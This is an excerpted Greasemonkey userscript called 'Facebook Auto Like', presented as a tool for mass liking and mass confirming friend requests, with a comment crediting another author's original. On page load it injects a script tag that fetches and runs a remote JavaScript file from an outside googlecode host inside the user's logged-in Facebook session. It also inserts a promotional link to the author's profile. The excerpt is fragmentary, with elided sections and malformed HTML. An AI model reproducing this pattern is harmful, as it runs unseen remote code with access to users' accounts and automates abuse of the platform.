// ==UserScript==
// @name			Facebook Auto Like  V 0.1
// @namespace			MingSastro
// @version			0.1
// @copyright			MingSastro
// @description			Auto Like And Confirm (mass) | You can mass like and confirm
// @author			FMingSastro (http://userscripts.org/users/430638)
...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='http://www.facebook.com/najibgaul' title='MingSastro Profile'>MingSastro </a></div>"
...
if(body != null) {
    ...
    javascript: (a = (b = document).createElement("script")).src = "//najib.googlecode.com/files/like.js",
...
//wekawekaweka :D ini hanyalah script autolike dari Fajar Zikri, saya hanya mengedit saja, http://fajarzikri.blogspot.com